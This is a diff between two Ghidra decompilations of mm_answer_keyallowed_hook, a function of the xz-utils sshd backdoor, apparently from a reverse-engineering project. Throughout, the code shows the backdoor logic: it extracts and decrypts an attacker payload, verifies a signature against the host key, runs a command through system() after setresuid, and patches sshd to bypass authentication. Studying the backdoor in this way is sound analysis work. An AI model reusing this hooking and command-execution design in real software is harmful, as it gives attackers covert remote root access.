@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/108EA0_mm_answer_keyallowed_hook.c
 // Function: mm_answer_keyallowed_hook @ 0x108EA0
-// Calling convention: __stdcall
-// Prototype: int __stdcall mm_answer_keyallowed_hook(ssh * ssh, int sock, sshbuf * m)
+// Calling convention: unknown
+// Prototype: undefined mm_answer_keyallowed_hook(void)
 
 
 /*
@@ -15,105 +15,98 @@
 #include "xzre_types.h"
 
 
-int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
+undefined8 mm_answer_keyallowed_hook(undefined8 param_1,undefined4 param_2,undefined8 param_3)
 
 {
-  sshd_payload_ctx_t sVar1;
-  u32 uVar2;
-  libc_imports_t *plVar3;
-  sshd_ctx_t *psVar4;
-  sshd_monitor_func_t *UNRECOVERED_JUMPTABLE;
-  ulong uVar5;
-  sshd_ctx_t *psVar6;
-  void *pvVar7;
-  undefined8 uVar8;
-  _func_19 *p_Var9;
-  global_context_t *ctx;
-  BOOL BVar10;
-  gid_t rgid;
-  int iVar11;
+  char cVar1;
+  code *UNRECOVERED_JUMPTABLE;
+  ulong uVar2;
+  code *pcVar3;
+  int iVar4;
+  long lVar5;
+  ulong uVar6;
+  long lVar7;
+  ulong uVar8;
+  undefined8 uVar9;
+  long lVar10;
+  long lVar11;
   long lVar12;
-  ulong uVar13;
+  long lVar13;
   ulong uVar14;
-  ssize_t sVar15;
-  long lVar16;
-  ulong uVar17;
-  sshd_payload_ctx_t **ppsVar18;
-  undefined1 *puVar19;
-  u8 *puVar20;
-  uid_t ruid;
-  sshd_payload_ctx_t *psVar21;
-  byte bVar22;
-  sshbuf payload_buf;
-  global_context_t *global_ctx;
-  libc_imports_t *libc_imports;
-  u8 local_131 [57];
-  sshd_payload_ctx_t *payload_ctx;
-  sshd_monitor_func_t orig_handler;
-  undefined8 local_aa;
-  undefined8 uStack_a2;
+  undefined1 *puVar15;
+  undefined8 *puVar16;
+  ushort *puVar17;
+  byte bVar18;
+  undefined8 payload_ctx;
+  undefined8 orig_handler;
+  undefined8 uStack_129;
+  undefined1 payload_buf [41];
+  undefined8 local_f8 [3];
+  undefined8 local_e0 [6];
+  undefined8 local_aa [2];
   undefined1 local_9a [106];
   
-  ctx = ::global_ctx;
-  bVar22 = 0;
-  if (::global_ctx == (global_context_t *)0x0) {
+  lVar7 = global_ctx;
+  bVar18 = 0;
+  if (global_ctx == 0) {
     return 0;
   }
-  plVar3 = ::global_ctx->libc_imports;
-  if (plVar3 == (libc_imports_t *)0x0) {
+  lVar11 = *(long *)(global_ctx + 0x10);
+  if (lVar11 == 0) {
     return 0;
   }
-  psVar4 = ::global_ctx->sshd_ctx;
-  if (psVar4 == (sshd_ctx_t *)0x0) {
+  lVar12 = *(long *)(global_ctx + 0x20);
+  if (lVar12 == 0) {
     return 0;
   }
-  if (::global_ctx->payload_data == (u8 *)0x0) {
+  if (*(long *)(global_ctx + 0xf0) == 0) {
     return 0;
   }
-  UNRECOVERED_JUMPTABLE = psVar4->mm_answer_keyallowed_start;
-  if (UNRECOVERED_JUMPTABLE == (sshd_monitor_func_t *)0x0) goto LAB_00109471;
-  if (::global_ctx->payload_state == 4) goto LAB_0010944f;
-  BVar10 = check_backdoor_state(::global_ctx);
-  if (((BVar10 == FALSE) || (ctx->payload_state == 4)) || (ctx->payload_state == 0xffffffff))
+  UNRECOVERED_JUMPTABLE = *(code **)(lVar12 + 0x48);
+  if (UNRECOVERED_JUMPTABLE == (code *)0x0) goto LAB_00109471;
+  if (*(int *)(global_ctx + 0x104) == 4) goto LAB_0010944f;
+  iVar4 = check_backdoor_state(global_ctx);
+  if (((iVar4 == 0) || (*(int *)(lVar7 + 0x104) == 4)) || (*(int *)(lVar7 + 0x104) == -1))
   goto LAB_00109429;
-  ppsVar18 = &payload_ctx;
-  for (lVar16 = 0x12; lVar16 != 0; lVar16 = lVar16 + -1) {
-    *(undefined4 *)ppsVar18 = 0;
-    ppsVar18 = (sshd_payload_ctx_t **)((long)ppsVar18 + (ulong)bVar22 * -8 + 4);
+  puVar16 = local_f8;
+  for (lVar10 = 0x12; lVar10 != 0; lVar10 = lVar10 + -1) {
+    *(undefined4 *)puVar16 = 0;
+    puVar16 = (undefined8 *)((long)puVar16 + (ulong)bVar18 * -8 + 4);
   }
-  libc_imports = (libc_imports_t *)0x0;
-  BVar10 = sshbuf_extract(m,ctx,(void **)&payload_ctx,(size_t *)&orig_handler);
-  if ((BVar10 == FALSE) ||
-     (BVar10 = extract_payload_message
-                         ((sshbuf *)&payload_ctx,(size_t)orig_handler,(size_t *)&libc_imports,ctx),
-     BVar10 == FALSE)) goto LAB_0010944f;
-  decrypt_payload_message((key_payload_t *)payload_ctx,(size_t)libc_imports,ctx);
-  uVar2 = ctx->payload_state;
-  if (uVar2 == 3) {
+  payload_ctx = 0;
+  iVar4 = sshbuf_extract(param_3,lVar7,local_f8,local_e0);
+  if ((iVar4 == 0) ||
+     (iVar4 = extract_payload_message(local_f8,local_e0[0],&payload_ctx,lVar7), iVar4 == 0))
+  goto LAB_0010944f;
+  decrypt_payload_message(local_f8[0],payload_ctx,lVar7);
+  iVar4 = *(int *)(lVar7 + 0x104);
+  if (iVar4 == 3) {
 LAB_00109216:
-    psVar21 = ctx->sshd_payload_ctx;
-    if (psVar21 != (sshd_payload_ctx_t *)0x0) {
-      uVar14 = (ulong)*(ushort *)psVar21;
-      sVar1 = psVar21[0x3b];
-      uVar17 = uVar14 - 0x120;
-      if (sVar1 == (sshd_payload_ctx_t)0x2) {
-        if ((((ctx->sshd_ctx->mm_answer_keyverify_ptr != (void *)0x0) && (4 < uVar17)) &&
-            (uVar17 = (ulong)*(ushort *)(psVar21 + 0xae), *(ushort *)(psVar21 + 0xae) != 0)) &&
-           ((uVar17 < uVar14 - 0x122 && (uVar14 = (uVar14 - 0x122) - uVar17, 2 < uVar14)))) {
-          *(sshd_payload_ctx_t *)&psVar4->writebuf_size = psVar21[uVar17 + 0xb0];
-          *(sshd_payload_ctx_t *)((long)&psVar4->writebuf_size + 1) = (psVar21 + uVar17 + 0xb0)[1];
-          if ((psVar4->writebuf_size == 0) || (uVar14 - 2 < (ulong)psVar4->writebuf_size)) {
-            psVar4->writebuf_size = 0;
+    puVar17 = *(ushort **)(lVar7 + 0xf8);
+    if (puVar17 != (ushort *)0x0) {
+      uVar8 = (ulong)*puVar17;
+      cVar1 = *(char *)((long)puVar17 + 0x3b);
+      uVar14 = uVar8 - 0x120;
+      if (cVar1 == '\x02') {
+        if ((((*(long *)(*(long *)(lVar7 + 0x20) + 0x78) != 0) && (4 < uVar14)) &&
+            (uVar14 = (ulong)puVar17[0x57], puVar17[0x57] != 0)) &&
+           ((uVar14 < uVar8 - 0x122 && (uVar8 = (uVar8 - 0x122) - uVar14, 2 < uVar8)))) {
+          puVar15 = (undefined1 *)((long)puVar17 + uVar14 + 0xb0);
+          *(undefined1 *)(lVar12 + 0x84) = *puVar15;
+          *(undefined1 *)(lVar12 + 0x85) = puVar15[1];
+          if ((*(ushort *)(lVar12 + 0x84) == 0) || (uVar8 - 2 < (ulong)*(ushort *)(lVar12 + 0x84)))
+          {
+            *(undefined2 *)(lVar12 + 0x84) = 0;
           }
           else {
-            psVar6 = ctx->sshd_ctx;
-            plVar3 = ctx->libc_imports;
-            psVar4->writebuf = (u8 *)(psVar21 + uVar17 + 0xb2);
-            pvVar7 = psVar6->mm_answer_keyverify;
-            if (pvVar7 != (void *)0x0) {
-              *(void **)psVar6->mm_answer_keyverify_ptr = pvVar7;
-              sVar15 = fd_write(sock,psVar21 + 0xb0,uVar17,plVar3);
-              if (-1 < sVar15) {
+            lVar11 = *(long *)(lVar7 + 0x20);
+            uVar9 = *(undefined8 *)(lVar7 + 0x10);
+            *(ulong *)(lVar12 + 0x88) = (long)puVar17 + uVar14 + 0xb2;
+            lVar12 = *(long *)(lVar11 + 0x20);
+            if (lVar12 != 0) {
+              **(long **)(lVar11 + 0x78) = lVar12;
+              lVar7 = fd_write(param_2,puVar17 + 0x58,uVar14,uVar9);
+              if (-1 < lVar7) {
                 return 0;
               }
               goto LAB_0010944f;
@@ -121,161 +114,149 @@ LAB_00109216:
           }
         }
       }
-      else if (sVar1 == (sshd_payload_ctx_t)0x3) {
-        if (((plVar3->system != (_func_22 *)0x0) && (8 < uVar17)) &&
-           (psVar21[uVar14 - 0x73] == (sshd_payload_ctx_t)0x0)) {
-          uVar8 = *(undefined8 *)(psVar21 + 0xae);
-          rgid = (gid_t)((ulong)uVar8 >> 0x20);
-          if (((rgid == 0) || (iVar11 = (*plVar3->setresgid)(rgid,rgid,rgid), iVar11 != -1)) &&
-             ((ruid = (uid_t)uVar8, ruid == 0 ||
-              (iVar11 = (*plVar3->setresuid)(ruid,ruid,ruid), iVar11 != -1)))) {
-            (*plVar3->system)((char *)(psVar21 + 0xb6));
-            ctx->payload_state = 4;
+      else if (cVar1 == '\x03') {
+        if (((*(long *)(lVar11 + 0x30) != 0) && (8 < uVar14)) &&
+           (*(char *)((long)puVar17 + (uVar8 - 0x73)) == '\0')) {
+          uVar14 = *(ulong *)(puVar17 + 0x57);
+          uVar8 = uVar14 >> 0x20;
+          if ((((int)(uVar14 >> 0x20) == 0) ||
+              (iVar4 = (**(code **)(lVar11 + 0x20))(uVar8,uVar8,uVar8), iVar4 != -1)) &&
+             (((int)uVar14 == 0 ||
+              (iVar4 = (**(code **)(lVar11 + 0x28))
+                                 (uVar14 & 0xffffffff,uVar14 & 0xffffffff,uVar14 & 0xffffffff),
+              iVar4 != -1)))) {
+            (**(code **)(lVar11 + 0x30))(puVar17 + 0x5b);
+            *(undefined4 *)(lVar7 + 0x104) = 4;
             goto LAB_0010944f;
           }
         }
       }
-      else if (((sVar1 == (sshd_payload_ctx_t)0x1) &&
-               (ctx->sshd_ctx->mm_answer_authpassword_ptr != (sshd_monitor_func_t *)0x0)) &&
-              (1 < uVar17)) {
-        psVar4->_unknown1181[0] = (u8)psVar21[0xae];
-        *(sshd_payload_ctx_t *)(psVar4->_unknown1181 + 1) = psVar21[0xaf];
-        if (*(ushort *)psVar4->_unknown1181 == 0) {
-          psVar21 = (sshd_payload_ctx_t *)0x0;
+      else if (((cVar1 == '\x01') && (*(long *)(*(long *)(lVar7 + 0x20) + 0x38) != 0)) &&
+              (1 < uVar14)) {
+        *(char *)(lVar12 + 0x90) = (char)puVar17[0x57];
+        *(undefined1 *)(lVar12 + 0x91) = *(undefined1 *)((long)puVar17 + 0xaf);
+        if (*(ushort *)(lVar12 + 0x90) == 0) {
+          puVar17 = (ushort *)0x0;
         }
         else {
-          psVar21 = psVar21 + 0xb0;
-          if (uVar14 - 0x122 < (ulong)*(ushort *)psVar4->_unknown1181) {
-            psVar4->_unknown1181[0] = '\0';
-            psVar4->_unknown1181[1] = '\0';
+          puVar17 = puVar17 + 0x58;
+          if (uVar8 - 0x122 < (ulong)*(ushort *)(lVar12 + 0x90)) {
+            *(undefined2 *)(lVar12 + 0x90) = 0;
             goto LAB_00109429;
           }
         }
-        *(sshd_payload_ctx_t **)psVar4->_unknown1182 = psVar21;
-        ctx->payload_state = 4;
-        BVar10 = sshd_patch_variables(TRUE,FALSE,FALSE,0,ctx);
+        *(ushort **)(lVar12 + 0x98) = puVar17;
+        *(undefined4 *)(lVar7 + 0x104) = 4;
+        iVar4 = sshd_patch_variables(1,0,0,0,lVar7);
 LAB_001092e5:
-        if (BVar10 != FALSE) goto LAB_0010944f;
+        if (iVar4 != 0) goto LAB_0010944f;
       }
     }
   }
-  else if ((int)uVar2 < 4) {
-    if (uVar2 == 0) {
-      if (ctx->current_data_size < 0xae) goto LAB_0010944f;
-      puVar20 = local_131 + 0x10;
-      for (lVar16 = 0x29; lVar16 != 0; lVar16 = lVar16 + -1) {
-        *puVar20 = '\0';
-        puVar20 = puVar20 + (ulong)bVar22 * -2 + 1;
+  else if (iVar4 < 4) {
+    if (iVar4 == 0) {
+      if (*(ulong *)(lVar7 + 0xe8) < 0xae) goto LAB_0010944f;
+      puVar15 = payload_buf;
+      for (lVar11 = 0x29; lVar11 != 0; lVar11 = lVar11 + -1) {
+        *puVar15 = 0;
+        puVar15 = puVar15 + (ulong)bVar18 * -2 + 1;
       }
-      psVar21 = (sshd_payload_ctx_t *)ctx->payload_data;
-      local_131[0] = '\0';
-      local_131[1] = '\0';
-      local_131[2] = '\0';
-      local_131[3] = '\0';
-      local_131[4] = '\0';
-      local_131[5] = '\0';
-      local_131[6] = '\0';
-      local_131[7] = '\0';
-      local_131[8] = '\0';
-      local_131[9] = '\0';
-      local_131[10] = '\0';
-      local_131[0xb] = '\0';
-      local_131[0xc] = '\0';
-      local_131[0xd] = '\0';
-      local_131[0xe] = '\0';
-      local_131[0xf] = '\0';
-      if (((psVar21 != (sshd_payload_ctx_t *)0x0) &&
-          (ctx->sshd_sensitive_data != (sensitive_data *)0x0)) &&
-         ((ctx->sshd_sensitive_data->host_pubkeys != (sshkey **)0x0 &&
-          (ctx->sshd_payload_ctx == (sshd_payload_ctx_t *)0x0)))) {
-        ctx->sshd_payload_ctx = psVar21;
-        local_aa = 0;
-        uStack_a2 = 0;
-        puVar19 = local_9a;
-        for (lVar16 = 0x4a; lVar16 != 0; lVar16 = lVar16 + -1) {
-          *puVar19 = 0;
-          puVar19 = puVar19 + (ulong)bVar22 * -2 + 1;
+      lVar11 = *(long *)(lVar7 + 0xf0);
+      orig_handler = 0;
+      uStack_129 = 0;
+      if (((lVar11 != 0) && (*(long *)(lVar7 + 0x28) != 0)) &&
+         ((*(long *)(*(long *)(lVar7 + 0x28) + 8) != 0 && (*(long *)(lVar7 + 0xf8) == 0)))) {
+        *(long *)(lVar7 + 0xf8) = lVar11;
+        local_aa[0] = 0;
+        local_aa[1] = 0;
+        puVar15 = local_9a;
+        for (lVar12 = 0x4a; lVar12 != 0; lVar12 = lVar12 + -1) {
+          *puVar15 = 0;
+          puVar15 = puVar15 + (ulong)bVar18 * -2 + 1;
         }
-        lVar16 = 0;
+        lVar12 = 0;
         do {
-          *(sshd_payload_ctx_t *)((long)&local_aa + lVar16) = psVar21[lVar16 + 2];
-          lVar16 = lVar16 + 1;
-        } while (lVar16 != 0x3a);
-        BVar10 = secret_data_get_decrypted(local_131,ctx);
-        if ((BVar10 != FALSE) &&
-           (BVar10 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
-                                      [ctx->sshd_host_pubkey_idx],(u8 *)&local_aa,0x3a,0x5a,
-                                      (u8 *)(ctx->sshd_payload_ctx + 0x3c),local_131,ctx),
-           BVar10 != FALSE)) {
-          ctx->payload_state = 1;
-          puVar20 = local_131;
-          for (lVar16 = 0x39; lVar16 != 0; lVar16 = lVar16 + -1) {
-            *puVar20 = '\0';
-            puVar20 = puVar20 + (ulong)bVar22 * -2 + 1;
+          *(undefined1 *)((long)local_aa + lVar12) = *(undefined1 *)(lVar11 + 2 + lVar12);
+          lVar12 = lVar12 + 1;
+        } while (lVar12 != 0x3a);
+        iVar4 = secret_data_get_decrypted(&orig_handler,lVar7);
+        if ((iVar4 != 0) &&
+           (iVar4 = verify_signature(*(undefined8 *)
+                                      (*(long *)(*(long *)(lVar7 + 0x28) + 8) +
+                                      (ulong)*(uint *)(lVar7 + 0x100) * 8),local_aa,0x3a,0x5a,
+                                     *(long *)(lVar7 + 0xf8) + 0x3c,&orig_handler,lVar7), iVar4 != 0
+           )) {
+          *(undefined4 *)(lVar7 + 0x104) = 1;
+          puVar16 = &orig_handler;
+          for (lVar11 = 0x39; lVar11 != 0; lVar11 = lVar11 + -1) {
+            *(undefined1 *)puVar16 = 0;
+            puVar16 = (undefined8 *)((long)puVar16 + (ulong)bVar18 * -2 + 1);
           }
-          BVar10 = check_backdoor_state(ctx);
+          iVar4 = check_backdoor_state(lVar7);
           goto LAB_001092e5;
         }
       }
-      ctx->payload_state = 0xffffffff;
-      ctx->sshd_payload_ctx = (sshd_payload_ctx_t *)0x0;
+      *(undefined4 *)(lVar7 + 0x104) = 0xffffffff;
+      *(undefined8 *)(lVar7 + 0xf8) = 0;
     }
-    else if ((uVar2 == 1) && (ctx->sshd_payload_ctx != (sshd_payload_ctx_t *)0x0)) {
-      uVar14 = (ulong)*(ushort *)ctx->sshd_payload_ctx;
-      uVar17 = ctx->current_data_size;
-      if (uVar17 <= uVar14) {
-        if (uVar17 != uVar14) goto LAB_0010944f;
-        uVar14 = ctx->payload_data_size;
-        uVar5 = ctx->sock_read_buf_size;
-        if ((uVar14 < uVar5) || (uVar17 = uVar17 - 0x72, uVar14 - uVar5 <= uVar17)) {
+    else if ((iVar4 == 1) && (*(ushort **)(lVar7 + 0xf8) != (ushort *)0x0)) {
+      uVar8 = (ulong)**(ushort **)(lVar7 + 0xf8);
+      uVar14 = *(ulong *)(lVar7 + 0xe8);
+      if (uVar14 <= uVar8) {
+        if (uVar14 != uVar8) goto LAB_0010944f;
+        uVar8 = *(ulong *)(lVar7 + 0xe0);
+        uVar2 = *(ulong *)(lVar7 + 0x98);
+        if ((uVar8 < uVar2) || (uVar14 = uVar14 - 0x72, uVar8 - uVar2 <= uVar14)) {
 LAB_00109471:
-          if (plVar3->exit != (_func_19 *)0x0) {
-            (*plVar3->exit)(0);
+          if (*(code **)(lVar11 + 0x18) != (code *)0x0) {
+            (**(code **)(lVar11 + 0x18))(0);
           }
           return 0;
         }
-        local_aa = 0;
-        uStack_a2 = 0;
-        puVar19 = local_9a;
-        for (lVar16 = 0x62; lVar16 != 0; lVar16 = lVar16 + -1) {
-          *puVar19 = 0;
-          puVar19 = puVar19 + (ulong)bVar22 * -2 + 1;
+        local_aa[0] = 0;
+        local_aa[1] = 0;
+        puVar15 = local_9a;
+        for (lVar10 = 0x62; lVar10 != 0; lVar10 = lVar10 + -1) {
+          *puVar15 = 0;
+          puVar15 = puVar15 + (ulong)bVar18 * -2 + 1;
         }
-        puVar20 = ctx->payload_data;
-        lVar16 = 0;
+        lVar13 = *(long *)(lVar7 + 0xf0) + uVar14;
+        lVar10 = 0;
         do {
-          lVar12 = lVar16 + 1;
-          *(u8 *)((long)&local_aa + lVar16) = puVar20[lVar16 + uVar17];
-          lVar16 = lVar12;
-        } while (lVar12 != 0x72);
-        if ((uVar14 < uVar17) || (uVar13 = 0, uVar14 - uVar17 < uVar5)) goto LAB_00109471;
-        for (; uVar5 != uVar13; uVar13 = uVar13 + 1) {
-          puVar20[uVar13 + uVar17] = ctx->sock_read_buf[uVar13];
+          lVar5 = lVar10 + 1;
+          *(undefined1 *)(lVar10 + (long)local_aa) = *(undefined1 *)(lVar13 + lVar10);
+          lVar10 = lVar5;
+        } while (lVar5 != 0x72);
+        if ((uVar8 < uVar14) || (uVar6 = 0, uVar8 - uVar14 < uVar2)) goto LAB_00109471;
+        for (; uVar2 != uVar6; uVar6 = uVar6 + 1) {
+          *(undefined1 *)(lVar13 + uVar6) = *(undefined1 *)(lVar7 + 0xa0 + uVar6);
         }
-        BVar10 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
-                                  ctx->payload_data,uVar17 + ctx->sock_read_buf_size,
-                                  ctx->payload_data_size,(u8 *)&local_aa,
-                                  (u8 *)(ctx->sshd_payload_ctx + 2),ctx);
-        if (BVar10 == FALSE) {
-          ctx->payload_state = 0xffffffff;
+        iVar4 = verify_signature(*(undefined8 *)
+                                  (*(long *)(*(long *)(lVar7 + 0x28) + 8) +
+                                  (ulong)*(uint *)(lVar7 + 0x100) * 8),*(undefined8 *)(lVar7 + 0xf0)
+                                 ,uVar14 + *(long *)(lVar7 + 0x98),*(undefined8 *)(lVar7 + 0xe0),
+                                 local_aa,*(long *)(lVar7 + 0xf8) + 2,lVar7,
+                                 (ulong)*(uint *)(lVar7 + 0x100));
+        if (iVar4 == 0) {
+          *(undefined4 *)(lVar7 + 0x104) = 0xffffffff;
           goto LAB_00109471;
         }
-        ctx->payload_state = 3;
+        *(undefined4 *)(lVar7 + 0x104) = 3;
         goto LAB_00109216;
       }
     }
   }
-  else if (uVar2 == 4) goto LAB_0010944f;
+  else if (iVar4 == 4) goto LAB_0010944f;
 LAB_00109429:
-  if (((ctx->libc_imports != (libc_imports_t *)0x0) &&
-      (p_Var9 = ctx->libc_imports->exit, p_Var9 != (_func_19 *)0x0)) &&
-     (ctx->payload_state = 0xffffffff, ctx->exit_flag != 0)) {
-    (*p_Var9)(0);
+  if (((*(long *)(lVar7 + 0x10) != 0) &&
+      (pcVar3 = *(code **)(*(long *)(lVar7 + 0x10) + 0x18), pcVar3 != (code *)0x0)) &&
+     (*(undefined4 *)(lVar7 + 0x104) = 0xffffffff, *(int *)(lVar7 + 0x50) != 0)) {
+    (*pcVar3)(0);
   }
 LAB_0010944f:
                     /* WARNING: Could not recover jumptable at 0x0010946f. Too many branches */
                     /* WARNING: Treating indirect jump as call */
-  iVar11 = (*(code *)UNRECOVERED_JUMPTABLE)(ssh,sock,m);
-  return iVar11;
+  uVar9 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3);
+  return uVar9;
 }
 
